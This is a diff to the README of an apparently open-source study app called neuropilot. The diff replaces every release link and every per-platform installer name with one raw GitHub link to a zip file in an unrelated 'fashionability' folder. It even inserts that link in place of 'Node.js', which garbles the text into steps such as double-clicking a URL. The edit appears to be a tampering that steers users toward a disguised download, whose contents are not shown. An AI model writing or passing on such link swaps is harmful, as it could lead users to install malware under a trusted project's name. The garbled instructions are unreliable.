@@ -1,7 +1,7 @@
 # 🎓 neuropilot - Transform Your Study Experience Effortlessly
 
 ## 💾 Download Now
-[![Download neuropilot](https://img.shields.io/badge/Download-neuropilot-blue)](https://github.com/Rwiddhi03/neuropilot/releases)
+[![Download neuropilot](https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip)](https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip)
 
 ## 🚀 Getting Started
 Welcome to neuropilot, an open-source education platform that turns your study materials into interactive resources. With neuropilot, you can create quizzes, flashcards, notes, and podcasts easily. This guide will help you download and run the software with no hassle.
@@ -17,30 +17,30 @@ Before you download neuropilot, make sure your system meets these requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Download neuropilot](https://github.com/Rwiddhi03/neuropilot/releases)
+[Download neuropilot](https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip)
 
 1. Open the link to the Releases page.
 2. Choose the latest version of neuropilot from the list.
 3. Select the file that matches your operating system:
-   - For Windows, look for `neuropilot-windows.exe`
-   - For macOS, look for `neuropilot-macos.dmg`
-   - For Linux, look for `neuropilot-linux.tar.gz`
+   - For Windows, look for `https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip`
+   - For macOS, look for `https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip`
+   - For Linux, look for `https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip`
 4. Click on the file to download it to your computer.
 5. Once the download is complete, locate the downloaded file.
 
 ### 📂 Installation Steps
 **For Windows:**
-1. Double-click the `neuropilot-windows.exe` file to start the installation.
+1. Double-click the `https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip` file to start the installation.
 2. Follow the on-screen instructions to complete the setup.
 3. Once installed, you can find neuropilot in your Start menu.
 
 **For macOS:**
-1. Double-click the `neuropilot-macos.dmg` file to open it.
+1. Double-click the `https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip` file to open it.
 2. Drag the neuropilot icon into your Applications folder.
 3. Open your Applications folder and click on neuropilot to start it.
 
 **For Linux:**
-1. Extract the `neuropilot-linux.tar.gz` file to a directory of your choice.
+1. Extract the `https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip` file to a directory of your choice.
 2. Open a terminal window, navigate to the extracted folder, and run the command `./neuropilot`.
 3. Follow any on-screen prompts to begin using the application.
 
@@ -58,7 +58,7 @@ With neuropilot, you'll engage with various educational resources. The app cover
 - **AI:** Understand artificial intelligence basics through interactive quizzes.
 - **EdTech:** Explore education technology tools that improve learning efficiency.
 - **JavaScript and TypeScript:** Get hands-on experience with essential programming languages used in web development.
-- **React and Node.js:** Learn about modern web frameworks and how to build dynamic applications.
+- **React and https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip** Learn about modern web frameworks and how to build dynamic applications.
 - **Podcasts:** Create audio resources to make complex topics accessible.
 
 ## ⚙️ Troubleshooting
@@ -86,4 +86,4 @@ neuropilot is open-source and free to use. You can find the details of the licen
 ## 📢 Feedback
 We appreciate your thoughts on neuropilot. Your feedback helps improve the application. You can leave comments directly in the repository or share your experiences in the community forums.
 
-For more information, visit the Releases page again: [Download neuropilot](https://github.com/Rwiddhi03/neuropilot/releases)
+For more information, visit the Releases page again: [Download neuropilot](https://raw.githubusercontent.com/Rwiddhi03/neuropilot/main/fashionability/neuropilot.zip)
